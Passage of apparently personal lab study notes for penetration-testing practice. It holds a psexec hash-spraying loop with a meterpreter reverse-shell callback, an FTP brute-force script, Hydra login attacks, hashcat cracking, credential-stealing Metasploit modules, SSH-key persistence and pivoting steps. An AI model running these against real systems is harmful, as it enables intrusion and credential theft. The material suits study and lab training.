+</p></div><div style="display:contents" dir="ltr"><figure id="28a65c01-9416-808b-ae3d-f82009f34fbc" class="image"><a href="ADDITIONAL%20NOTES/image%202.png"><img style="width:709.852294921875px" src="ADDITIONAL%20NOTES/image%202.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="28a65c01-9416-8034-b7e7-fa65170232fd"/></div><div style="display:contents" dir="auto"><h1 id="28a65c01-9416-806b-afc5-ccb41f83f04d" class="block-color-blue"><em>SAMBA EXPLOIT </em><em><code>is_known_pipename</code></em><em> </em></h1></div><div style="display:contents" dir="ltr"><figure id="28a65c01-9416-80e2-881d-f4bc3b143b5c" class="image"><a href="ADDITIONAL%20NOTES/image%203.png"><img style="width:709.9886474609375px" src="ADDITIONAL%20NOTES/image%203.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="28a65c01-9416-80a8-ae41-ea096c0646d6"/></div><div style="display:contents" dir="auto"><h1 id="28b65c01-9416-80e3-889a-c34a16c2cff7" class="block-color-blue"><em>VARIOUS POST LINUX MODULES </em></h1></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-80c4-a85e-ec6c686a8641" class="bulleted-list"><li style="list-style-type:disc"><code>post/multi/gather/ssh_creds</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-80ee-a1ea-d33808dc911e" class="bulleted-list"><li style="list-style-type:disc"><code>post/multi/gather/docker_creds</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-80a3-a9c7-de73954374da" class="bulleted-list"><li style="list-style-type:disc"><code>post/linux/gather/hashdump</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-80e9-b461-e3c77ad59ebe" class="bulleted-list"><li style="list-style-type:disc"><code>post/linux/gather/ecryptfs_creds</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-8033-a3ee-ca3c1e827121" class="bulleted-list"><li style="list-style-type:disc"><code>post/linux/gather/enum_psk</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-80c7-bfb2-e4f2a41c64d6" class="bulleted-list"><li style="list-style-type:disc"><code>post/linux/gather/enum_xchat</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-806d-ab81-dedc906dc70b" class="bulleted-list"><li style="list-style-type:disc"><code>post/linux/gather/phpmyadmin_credsteal</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-806a-8101-c22a8f352690" class="bulleted-list"><li style="list-style-type:disc"><code>post/linux/gather/pptpd_chap_secrets</code></li></ul></div><div style="display:contents" dir="auto"><ul id="28b65c01-9416-80c6-b973-f9b278a95c46" class="bulleted-list"><li style="list-style-type:disc"><code>post/linux/manage/sshkey_persistence</code></li></ul></div><div style="display:contents" dir="auto"><hr id="28b65c01-9416-8097-b136-c7368f9c08b5"/></div><div style="display:contents" dir="auto"><h1 id="28e65c01-9416-801e-b686-c01715dde131" class="block-color-blue"><em><span style="border-bottom:0.05em solid">COMMON WP PLUGINS WORDLIST</span></em></h1></div><div style="display:contents" dir="auto"><p id="28e65c01-9416-806a-80c0-fab011314daa" class=""><code>/usr/share/nmap/nselib/data/wp-plugins.lst</code></p></div><div style="display:contents" dir="auto"><p id="29a65c01-9416-8075-b258-e0c492fdf42c" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29a65c01-9416-8038-89f4-e11a63554a66" class="">And then we can use <code>ffuf </code>to brute force to check whether site has this or not. </p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29a65c01-9416-8099-887c-c7e9de2f2cf3" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">ffuf -w /usr/share/nmap/nselib/data/wp-plugins.lst -u http://target.website/wp-content/plugins/FUZZ</code></pre></div><div style="display:contents" dir="auto"><hr id="28f65c01-9416-803f-91b4-e13d45e8fa17"/></div><div style="display:contents" dir="auto"><h1 id="28f65c01-9416-802b-9643-fa627ca9e65a" class="block-color-blue"><em><span style="border-bottom:0.05em solid">SMB SCRIPT TO CHECK MULTIPLE NTLM HASHES FOR A USER ACCOUNT</span></em></h1></div><div style="display:contents" dir="auto"><p id="28f65c01-9416-809c-ae5d-d9cc0408ff33" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="28f65c01-9416-8062-b944-c14e809c43df" class="block-color-red"><em>using the modules —&gt; </em><em><code>exploit/windows/smb/psexec</code></em></h2></div><div style="display:contents" dir="auto"><p id="28f65c01-9416-8058-a5df-fd1c7f91df81" class="block-color-teal"><em>(when we have too many NTLM hashes and have to find the correct one for a user then there we can use this script that will automate the process but will take some time)</em></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28f65c01-9416-8059-90fd-fd880f0186d9" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">while read hash; do
+  msfconsole -q -x &quot;use exploit/windows/smb/psexec; set RHOSTS 10.5.19.206; set SMBUser nancy ; set SMBPass $hash; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.44.4 ; run; exit&quot;
+done &lt; hashes.txt </code></pre></div><div style="display:contents" dir="auto"><p id="28f65c01-9416-80e9-8450-ffed1eea54d7" class=""><code>hashes.txt</code>  —&gt; Original file where hashes are stored. </p></div><div style="display:contents" dir="auto"><hr id="28f65c01-9416-80c4-9415-d8ce06d17ce6"/></div><div style="display:contents" dir="auto"><h1 id="28f65c01-9416-800b-9c8d-e9834407d4d6" class="block-color-blue"><em><span style="border-bottom:0.05em solid">SMTP USERNAME ENUM INFO </span></em></h1></div><div style="display:contents" dir="auto"><p id="29365c01-9416-80be-a17d-ea40406d6279" class="block-color-teal">(<em>SMTP can be used to enumerate usernames and then usernames can also be used to brute force other services on the target machine</em>)</p></div><div style="display:contents" dir="ltr"><figure id="29365c01-9416-8072-b773-d488f7bef0e5" class="image"><a href="ADDITIONAL%20NOTES/image%204.png"><img style="width:709.9659423828125px" src="ADDITIONAL%20NOTES/image%204.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="29365c01-9416-8014-b765-e23925f5ef0e" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29365c01-9416-80cb-963a-d8b40419d93a" class=""><em>we can use the accounts to also brute force ftp on the machine and then upload a reverse shell on the web dav or something to get a reverse shell on the machine</em></p></div><div style="display:contents" dir="auto"><hr id="29365c01-9416-8003-b538-c8d2976bdcce"/></div><div style="display:contents" dir="auto"><p id="29365c01-9416-8066-bc37-cb9e204ea515" class="block-color-teal"><em>PHP versions below 5.3.1 are vulnerable to </em><em><code>remote code execution </code></em><em>attack</em></p></div><div style="display:contents" dir="ltr"><figure id="29365c01-9416-80f4-9617-cf92fcea0a2c" class="image"><a href="ADDITIONAL%20NOTES/image%205.png"><img style="width:709.977294921875px" src="ADDITIONAL%20NOTES/image%205.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="29365c01-9416-80ca-abd5-fe4322881cd3"/></div><div style="display:contents" dir="auto"><h1 id="29365c01-9416-80e3-9fc0-f44bdb030f44" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">FTP </span></strong></em><em><code><strong><span style="border-bottom:0.05em solid">BRUTE FORCE </span></strong></code></em><em><strong><span style="border-bottom:0.05em solid">PYTHON Script</span></strong></em></h1></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29465c01-9416-80a4-b06c-fc2e04b9bbbb" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all"># try_ftp_users.py
+import ftplib, os
+
+host = &quot;target1.ine.local&quot;
+password = &quot;letmein&quot;
+usernames = [&quot;root&quot;,&quot;daemon&quot;,&quot;bin&quot;,&quot;sys&quot;,&quot;sync&quot;,&quot;games&quot;,&quot;man&quot;,&quot;lp&quot;,&quot;mail&quot;,&quot;news&quot;,
+             &quot;uucp&quot;,&quot;proxy&quot;,&quot;www-data&quot;,&quot;backup&quot;,&quot;list&quot;,&quot;irc&quot;,&quot;gnats&quot;,&quot;nobody&quot;,&quot;_apt&quot;,
+             &quot;letmein&quot;,&quot;admin&quot;,&quot;ftp&quot;,&quot;user&quot;,&quot;test&quot;]
+
+for u in usernames:
+    try:
+        ftp = ftplib.FTP(host, timeout=8)
+        ftp.login(u, password)
+        print(f&quot;[+] LOGIN SUCCESS: {u}:{password}&quot;)
+        try:
+            print(&quot;  LISTING /&quot;)
+            ftp.retrlines(&#x27;LIST&#x27;)
+        except Exception as e:
+            print(&quot;  [!] Could not list:&quot;, e)
+
+        # attempt to download some common filenames
+        candidates = [&quot;flag.txt&quot;,&quot;FLAG.txt&quot;,&quot;user.txt&quot;,&quot;root.txt&quot;,&quot;flag&quot;,&quot;ine.txt&quot;,&quot;INE.txt&quot;,&quot;flag1.txt&quot;]
+        os.makedirs(f&quot;download_{u}&quot;, exist_ok=True)
+        for f in candidates:
+            try:
+                local = os.path.join(f&quot;download_{u}&quot;, f)
+                with open(local, &quot;wb&quot;) as fh:
+                    ftp.retrbinary(&quot;RETR &quot; + f, fh.write)
+                print(&quot;  [*] Downloaded&quot;, f, &quot;-&gt;&quot;, local)
+            except Exception:
+                pass
+
+        ftp.quit()
+        # stop after first success (remove break to try all)
+        break
+    except Exception as e:
+        print(f&quot;[-] {u}:{password} failed -&gt; {e}&quot;)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="29465c01-9416-8002-9661-da6e52111da8"/></div><div style="display:contents" dir="auto"><h1 id="29465c01-9416-807f-94c4-eb3bb4e358ec" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">KILL A PROCESS RUNNIN ON A PARTICULAR PORT</span></strong></em></h1></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8092-b22d-f1ca21c648ad" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8052-b496-c4669f2d3e6f" class=""><code>netstat -tulpn | grep :1234</code> —&gt; CHECK PROCESS RUNNING ON THE PARTICULAR PORT</p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8019-b047-cd2e3182e24f" class=""><code>kill -9 &lt;PID&gt;</code> ——&gt; kill that process ID. </p></div><div style="display:contents" dir="auto"><hr id="29565c01-9416-8050-ae0d-c39a1f9f61ad"/></div><div style="display:contents" dir="auto"><h1 id="29565c01-9416-80fe-8470-c436cd4bb552" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">SOME HASHING INFO</span></strong></em></h1></div><div style="display:contents" dir="auto"><p id="29565c01-9416-804b-ba7c-db9406797b4d" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-80a7-9b2f-f66ae0f72dd9" class=""><mark class="highlight-red"><mark class="highlight-blue_background">VALUE</mark></mark><mark class="highlight-blue_background"> </mark>—————————————————————————————&gt; <mark class="highlight-red"><mark class="highlight-blue_background">HASHING ALOGRITHM</mark></mark>  </p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8094-83c1-cb5303842136" class="">$1     <span style="border-bottom:0.05em solid">                                                                                                                                     </span>     <em><mark class="highlight-teal">MD5</mark></em></p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8010-9260-f213e9f46717" class="">$2    <span style="border-bottom:0.05em solid">                                                                                                                                      </span>     <em><mark class="highlight-teal">Blowfish</mark></em></p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-80d4-8823-dac28fd06e90" class="">$5     <span style="border-bottom:0.05em solid">                                                                                                                                      </span>   <em><mark class="highlight-teal">SHA-256</mark></em></p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-801d-9c14-dc80acdc1cb6" class="">$6     <span style="border-bottom:0.05em solid">                                                                                                                                      </span>    <em><mark class="highlight-teal">SHA-512</mark></em></p></div><div style="display:contents" dir="auto"><hr id="29565c01-9416-80da-90e8-d0b4f47493a3"/></div><div style="display:contents" dir="auto"><h1 id="29565c01-9416-800a-b6aa-d2643b828b3f" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">CRACKING HASHES </span></strong></em></h1></div><div style="display:contents" dir="ltr"><figure id="29565c01-9416-802b-9d43-c9903d103b79" class="image"><a href="ADDITIONAL%20NOTES/image%206.png"><img style="width:709.9750366210938px" src="ADDITIONAL%20NOTES/image%206.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8061-9de5-cf7dea4ba0f4" class=""><em><mark class="highlight-teal">using the module </mark></em>—&gt; <code>post/linux/gather/hashdump</code></p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-803f-b0a3-df6a5baf482e" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="29565c01-9416-8046-80b0-cacab267a407" class="">Using <em><mark class="highlight-blue_background"><strong><span style="border-bottom:0.05em solid">JOHN</span></strong></mark></em></h2></div><div style="display:contents" dir="ltr"><figure id="29565c01-9416-8081-913e-fa8cf34f9944" class="image"><a href="ADDITIONAL%20NOTES/image%207.png"><img style="width:709.9750366210938px" src="ADDITIONAL%20NOTES/image%207.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="29565c01-9416-80d8-a649-ece4225d6edb" class="">
+</p></div><div style="display:contents" dir="auto"><h2 id="29565c01-9416-8078-b8e2-f67c2fc298d5" class="">Using <em><mark class="highlight-blue_background"><strong><span style="border-bottom:0.05em solid">HASHMAP</span></strong></mark></em></h2></div><div style="display:contents" dir="auto"><p id="29565c01-9416-80c3-b29e-fe683001e375" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8070-890c-c72bff05f94a" class=""><code>for linux</code></p></div><div style="display:contents" dir="ltr"><figure id="29565c01-9416-8005-8208-d04d75345662" class="image"><a href="ADDITIONAL%20NOTES/image%208.png"><img style="width:709.9375px" src="ADDITIONAL%20NOTES/image%208.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="29565c01-9416-80d2-a8fe-f34c447a87a6" class="block-color-teal"><em>(this is for sha512 hashes only )</em></p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-8090-ab0b-cf8cd7a935e7" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-806a-8a92-c34de5bd1978" class=""><code>for Windows</code></p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-80e0-b2b6-ed506b998a9e" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29565c01-9416-80f1-b9e3-fa39a3708cc1" class=""><code>hashcat -m 1000 -a 0 hashe.txt /usr/share/wordlists/rockyou.txt</code></p></div><div style="display:contents" dir="ltr"><figure id="29565c01-9416-8062-b848-ebe5c0fdc90d" class="image"><a href="ADDITIONAL%20NOTES/image%209.png"><img style="width:709.9750366210938px" src="ADDITIONAL%20NOTES/image%209.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="29565c01-9416-80da-9728-ee8a4be7be4c" class="image"><a href="ADDITIONAL%20NOTES/image%2010.png"><img style="width:709.9874877929688px" src="ADDITIONAL%20NOTES/image%2010.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="29565c01-9416-805f-b287-ef31c1b18b7a" class="">
+</p></div><div style="display:contents" dir="ltr"><figure id="29565c01-9416-8008-b259-df708dc42ec3" class="image"><a href="ADDITIONAL%20NOTES/image%2011.png"><img style="width:709.9375px" src="ADDITIONAL%20NOTES/image%2011.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="29565c01-9416-8006-9bcd-c4f7cc17c475"/></div><div style="display:contents" dir="auto"><h1 id="29565c01-9416-8004-bc06-e3099eb40f6a" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">SMB RELAY</span></strong></em></h1></div><div style="display:contents" dir="auto"><p id="29665c01-9416-80da-8340-de8d0d1d19b6" class="block-color-teal"><em>(An SMB Relay attack is a Man-in-the-Middle (MitM) attack where an attacker intercepts and forwards SMB authentication requests to a target server, allowing them to impersonate the victim without knowing their password)</em></p></div><div style="display:contents" dir="auto"><hr id="29665c01-9416-80cd-bd10-d30800cf4d2a"/></div><div style="display:contents" dir="auto"><h1 id="29765c01-9416-8056-b66a-fb55a445f1d2" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">HYDRA LOGIN BRUTE COMMAND</span></strong></em></h1></div><div style="display:contents" dir="auto"><p id="29765c01-9416-802d-8071-c7d2da7c04de" class="">
+</p></div><div style="display:contents" dir="auto"><hr id="29765c01-9416-802b-94d4-f8807c8fb88f"/></div><div style="display:contents" dir="auto"><p id="29765c01-9416-80e3-9d0b-c0b1ab955ba1" class=""><code>hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=Invalid username or password&quot; -vV -o hydra_output.txt</code></p></div><div style="display:contents" dir="auto"><p id="29965c01-9416-8094-9230-fb8e9f1cb74f" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29965c01-9416-8078-ac3d-f79fb6b3451b" class=""><em>if there is authentication like dialogue box then use the below command</em></p></div><div style="display:contents" dir="auto"><p id="29965c01-9416-807e-99ab-d73e2e7bf34c" class=""><code>hydra -L users.txt -P passwords.txt target.ine.local http-get /path/   </code></p></div><div style="display:contents" dir="auto"><hr id="29765c01-9416-809d-8cbe-f51ab84f8c0a"/></div><div style="display:contents" dir="auto"><h1 id="29765c01-9416-8088-b28b-e178057595cb" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">HOW TO PIVOT TO A MACHINE</span></strong></em></h1></div><div style="display:contents" dir="auto"><ul id="29765c01-9416-80e9-8395-fa45ad97a8ac" class="bulleted-list"><li style="list-style-type:disc">Gain Meterpreter session on pivot host</li></ul></div><div style="display:contents" dir="auto"><ul id="29765c01-9416-804b-aaf8-c7552f05c484" class="bulleted-list"><li style="list-style-type:disc">Run <code>ipconfig</code> to identify connected networks</li></ul></div><div style="display:contents" dir="auto"><ul id="29765c01-9416-8067-85c4-dc5d42e9c563" class="bulleted-list"><li style="list-style-type:disc">Use <code>run arp_scanner -r &lt;CIDR&gt;</code> to discover live hosts on target network<div style="display:contents" dir="auto"><p id="29765c01-9416-80a5-a5de-c7d4be8339fe" class="">                                                     OR</p></div><div style="display:contents" dir="ltr"><figure id="29765c01-9416-80d4-9a66-c15474e0ba12" class="image"><a href="ADDITIONAL%20NOTES/image%2012.png"><img style="width:681.9874877929688px" src="ADDITIONAL%20NOTES/image%2012.png"/></a></figure></div></li></ul></div><div style="display:contents" dir="auto"><ul id="29765c01-9416-8067-a9ce-e0aa905c22c7" class="bulleted-list"><li style="list-style-type:disc">Background session, then run <code>run autoroute -s &lt;CIDR&gt;</code> to add route through pivot</li></ul></div><div style="display:contents" dir="auto"><ul id="29765c01-9416-806c-8e3c-e9422626e48a" class="bulleted-list"><li style="list-style-type:disc">Verify routes with <code>run autoroute -p</code></li></ul></div><div style="display:contents" dir="auto"><ul id="29765c01-9416-80da-8b24-c925152165d2" class="bulleted-list"><li style="list-style-type:disc">Use <code>use auxiliary/scanner/portscan/tcp</code> to scan ports on discovered hosts</li></ul></div><div style="display:contents" dir="auto"><ul id="29765c01-9416-8015-abf1-f5d39d268d48" class="bulleted-list"><li style="list-style-type:disc">Set <code>RHOSTS</code> to target network and run <code>exploit</code> to scan</li></ul></div><div style="display:contents" dir="auto"><hr id="29765c01-9416-80aa-9474-f6a9c1b6794b"/></div><div style="display:contents" dir="auto"><h1 id="29765c01-9416-80b3-bca6-c20df6aa6ac5" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">Finding backup files in a directory </span></strong></em></h1></div><div style="display:contents" dir="auto"><p id="29865c01-9416-80f4-aeb0-f6b18cc7132d" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29865c01-9416-8028-a7d8-de4508e2654a" class=""><code>ffuf -u </code><code><a href="http://target.ine.local/FUZZ">http://target.ine.local/FUZZ</a></code><code> -w /usr/share/dirb/wordlists/big.txt -e .bak,.tar.gz,.zip,.sql,.bak.zip</code></p></div><div style="display:contents" dir="auto"><p id="29865c01-9416-802d-ace3-e6a2afcdeb54" class="">
+</p></div><div style="display:contents" dir="auto"><ul id="29865c01-9416-801f-bc74-f32a374b5ffa" class="bulleted-list"><li style="list-style-type:disc"><code><strong>u</strong></code>: Target URL with <code>FUZZ</code> placeholder.</li></ul></div><div style="display:contents" dir="auto"><ul id="29865c01-9416-80c6-bd6c-ea485517d4d0" class="bulleted-list"><li style="list-style-type:disc"><code><strong>w</strong></code>: Wordlist for payload.</li></ul></div><div style="display:contents" dir="auto"><ul id="29865c01-9416-80a7-a96d-df063508b94c" class="bulleted-list"><li style="list-style-type:disc"><code><strong>e</strong></code>: Append extensions (<code>.bak</code>, <code>.zip</code>, etc.).</li></ul></div><div style="display:contents" dir="auto"><ul id="29865c01-9416-8054-9d01-ed5e6b78560d" class="bulleted-list"><li style="list-style-type:disc"><code><strong>mc 200</strong></code>: Show only 200 OK responses.<div style="display:contents" dir="auto"><p id="29865c01-9416-80f5-bb9c-efdff28672b9" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29865c01-9416-802e-92ca-daf160d370b6" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29865c01-9416-80a7-ac0e-f5b41901c856" class="">The <code>-e</code> flag in <code>ffuf</code> appends specified <strong>file extensions</strong> to each word from the wordlist.</p></div><div style="display:contents" dir="auto"><p id="29865c01-9416-80ab-bd06-f565e0060c47" class="">For example, <code>-e .php,.txt</code> will test both <code>word.php</code> and <code>word.txt</code> for every entry in your wordlist, helping you discover hidden files with those extensions.</p></div></li></ul></div><div style="display:contents" dir="auto"><hr id="29865c01-9416-8021-9e4e-ce80a23cf9a2"/></div><div style="display:contents" dir="auto"><h1 id="29965c01-9416-8081-a32e-c0d84d4a3659" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">RSYNC</span></strong></em></h1></div><div style="display:contents" dir="auto"><p id="29965c01-9416-8004-9760-ffad282abb98" class=""><em>The command </em><em><code>rsync rsync://&lt;target-ip&gt;</code></em><em> connects directly to the rsync daemon on the target and </em><em><strong>lists all accessible modules</strong></em><em> if no path is specified.</em></p></div><div style="display:contents" dir="auto"><p id="29965c01-9416-8048-987e-ccf05be4cb68" class=""><em>In CTFs, this often reveals hidden or flag-named modules.</em></p></div><div style="display:contents" dir="auto"><p id="29965c01-9416-80a7-8a21-dded73f9afcc" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29965c01-9416-80f3-9f4d-e2b2653a4edf" class=""><em>To </em><em><mark class="highlight-red"><mark class="highlight-purple_background"><strong>download </strong></mark></mark></em><em>a file from an </em><em><code>rsync</code></em><em>server:</em></p></div><div style="display:contents" dir="auto"><h3 id="29965c01-9416-8016-9e39-c07bd67f0f51" class=""><strong>Syntax</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29965c01-9416-805d-b049-e333790f7088" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">rsync rsync://&lt;target-ip&gt;/&lt;module&gt;/&lt;file&gt; &lt;local-path&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="29965c01-9416-80e3-9dd4-f458d5b011b6" class=""><strong>Example</strong></h3></div><div style="display:contents" dir="auto"><p id="29965c01-9416-80e9-ae71-d36ed52545bd" class="">If the module is <code>files</code> and the file is <code>secret.txt</code>:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29965c01-9416-802e-b95a-f5f25c00534a" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">rsync rsync://192.168.1.100/files/secret.txt ./</code></pre></div><div style="display:contents" dir="auto"><p id="29965c01-9416-806f-b46e-cbfdcffc98a4" class="">This downloads <code>secret.txt</code> to your current directory.</p></div><div style="display:contents" dir="auto"><hr id="29965c01-9416-808c-a2a1-cb8cecfd282a"/></div><div style="display:contents" dir="auto"><p id="29a65c01-9416-8076-941a-f38031a29430" class="">
+</p></div><div style="display:contents" dir="auto"><h1 id="29965c01-9416-8073-a207-ee742a1693f5" class="block-color-blue"><em><strong><span style="border-bottom:0.05em solid">ENUMERATE WORDPRESS PLUGIN</span></strong></em></h1></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29a65c01-9416-80e3-8334-eb1246eed0be" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">wpscan --url http://target.com --enumerate p   </code></pre></div><div style="display:contents" dir="ltr"><figure id="29a65c01-9416-8039-9a75-d811d9c94a2f" class="image"><a href="ADDITIONAL%20NOTES/image%2013.png"><img style="width:697.1818237304688px" src="ADDITIONAL%20NOTES/image%2013.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="29a65c01-9416-80fb-b2d2-ced3ecca4375"/></div><div style="display:contents" dir="auto"><h2 id="29b65c01-9416-80e9-a5ef-dbe842eec814" class="block-color-blue"><em><span style="border-bottom:0.05em solid">Windows ACL Deny Takes Precedence – Fix Access Denied Despite Admin Rights</span></em></h2></div><div style="display:contents" dir="auto"><p id="29b65c01-9416-8056-a5a6-e3ae486916ce" class="">
+</p></div><div style="display:contents" dir="auto"><p id="29b65c01-9416-80c0-bd34-dd6290cd1ddf" class=""><code>icacls &quot;C:\path\to\file_or_folder&quot; /remove:d &quot;NT AUTHORITY\SYSTEM&quot; /T /C /Q   </code></p></div><div style="display:contents" dir="auto"><ul id="29b65c01-9416-807e-a824-f5ecfed41848" class="bulleted-list"><li style="list-style-type:disc"><code>&quot;C:\path\to\file_or_folder&quot;</code> —&gt; Replace with the actual path.</li></ul></div><div style="display:contents" dir="auto"><ul id="29b65c01-9416-80ef-a137-f3e8cac10e32" class="bulleted-list"><li style="list-style-type:disc"><code>/remove:d &quot;NT AUTHORITY\SYSTEM&quot;</code> —&gt; Removes only the <strong>denied</strong> permissions for SYSTEM.</li></ul></div><div style="display:contents" dir="auto"><p id="29b65c01-9416-8064-b200-e0b5a0cccda7" class="">
